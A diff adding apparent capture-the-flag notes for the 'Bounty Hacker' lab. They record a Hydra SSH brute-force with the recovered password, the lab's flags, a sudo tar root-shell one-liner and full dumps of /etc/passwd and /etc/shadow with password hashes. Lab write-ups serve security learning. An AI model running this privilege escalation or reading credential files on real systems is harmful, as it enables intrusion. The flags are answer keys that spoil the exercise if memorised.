@@ -1,0 +1,149 @@
+https://www.youtube.com/watch?v=9ttgaCYJ7kU					
+					Enum
+
+(found potentail users)
+
+user:Spike
+user:Jet
+user:Ed
+user:Faye
+
+					ftp
+
+(anon only)
+user:anonyous
+pass:none
+
+(found potential pass list)
+locks.txt
+
+(fond potential user in task.txt)
+lin
+
+					brutessh
+
+(hydra)
+user:lin
+pass:RedDr4gonSynd1cat3
+
+
+					ssh
+$cat user.txt
+THM{CR1M3_SyNd1C4T3}
+
+
+					privesc
+
+$sudo -l 
+[sudo] password for lin: 
+Matching Defaults entries for lin on bountyhacker:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User lin may run the following commands on bountyhacker:
+    (root) /bin/tar
+
+
+
+$sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
+
+
+$cd /root
+
+$cat root.txt
+THM{80UN7Y_h4cK3r}
+
+					$h!+$ n gigs
+
+# cat /etc/passwd
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false
+systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false
+systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false
+systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false
+syslog:x:104:108::/home/syslog:/bin/false
+_apt:x:105:65534::/nonexistent:/bin/false
+messagebus:x:106:110::/var/run/dbus:/bin/false
+uuidd:x:107:111::/run/uuidd:/bin/false
+lightdm:x:108:114:Light Display Manager:/var/lib/lightdm:/bin/false
+whoopsie:x:109:117::/nonexistent:/bin/false
+avahi-autoipd:x:110:119:Avahi autoip daemon,,,:/var/lib/avahi-autoipd:/bin/false
+avahi:x:111:120:Avahi mDNS daemon,,,:/var/run/avahi-daemon:/bin/false
+dnsmasq:x:112:65534:dnsmasq,,,:/var/lib/misc:/bin/false
+colord:x:113:123:colord colour management daemon,,,:/var/lib/colord:/bin/false
+speech-dispatcher:x:114:29:Speech Dispatcher,,,:/var/run/speech-dispatcher:/bin/false
+hplip:x:115:7:HPLIP system user,,,:/var/run/hplip:/bin/false
+kernoops:x:116:65534:Kernel Oops Tracking Daemon,,,:/:/bin/false
+pulse:x:117:124:PulseAudio daemon,,,:/var/run/pulse:/bin/false
+rtkit:x:118:126:RealtimeKit,,,:/proc:/bin/false
+saned:x:119:127::/var/lib/saned:/bin/false
+usbmux:x:120:46:usbmux daemon,,,:/var/lib/usbmux:/bin/false
+ftp:x:121:129:ftp daemon,,,:/srv/ftp:/bin/false
+lin:x:1001:1001:Lin,,,:/home/lin:/bin/bash
+sshd:x:122:65534::/var/run/sshd:/usr/sbin/nologin
+
+
+# cat /etc/shadow
+root:$6$CIGJ0Sgt$OlKACZeDlAdF1NZUaWUAUY6DDj.X27a2erTfqgRmpFiVZe6GXWtIzDj.WVFxCyCW6joATNEBxljZwAQ9DoFdZ.:18420:0:99999:7:::
+daemon:*:17953:0:99999:7:::
+bin:*:17953:0:99999:7:::
+sys:*:17953:0:99999:7:::
+sync:*:17953:0:99999:7:::
+games:*:17953:0:99999:7:::
+man:*:17953:0:99999:7:::
+lp:*:17953:0:99999:7:::
+mail:*:17953:0:99999:7:::
+news:*:17953:0:99999:7:::
+uucp:*:17953:0:99999:7:::
+proxy:*:17953:0:99999:7:::
+www-data:*:17953:0:99999:7:::
+backup:*:17953:0:99999:7:::
+list:*:17953:0:99999:7:::
+irc:*:17953:0:99999:7:::
+gnats:*:17953:0:99999:7:::
+nobody:*:17953:0:99999:7:::
+systemd-timesync:*:17953:0:99999:7:::
+systemd-network:*:17953:0:99999:7:::
+systemd-resolve:*:17953:0:99999:7:::
+systemd-bus-proxy:*:17953:0:99999:7:::
+syslog:*:17953:0:99999:7:::
+_apt:*:17953:0:99999:7:::
+messagebus:*:17954:0:99999:7:::
+uuidd:*:17954:0:99999:7:::
+lightdm:*:17954:0:99999:7:::
+whoopsie:*:17954:0:99999:7:::
+avahi-autoipd:*:17954:0:99999:7:::
+avahi:*:17954:0:99999:7:::
+dnsmasq:*:17954:0:99999:7:::
+colord:*:17954:0:99999:7:::
+speech-dispatcher:!:17954:0:99999:7:::
+hplip:*:17954:0:99999:7:::
+kernoops:*:17954:0:99999:7:::
+pulse:*:17954:0:99999:7:::
+rtkit:*:17954:0:99999:7:::
+saned:*:17954:0:99999:7:::
+usbmux:*:17954:0:99999:7:::
+ftp:*:18420:0:99999:7:::
+lin:$6$iAdO55BsDuqY/lHq$sPxF8jcQHAsTphZ3V5hmwQV6cE23Ade3n.lK4LdDJfBQM4Pi3FkxMSYh1xx5DxUmhbJfbxlldG9o5VfWxBI2y0:18420:0:99999:7:::
+sshd:*:18420:0:99999:7:::
+
+
+
+
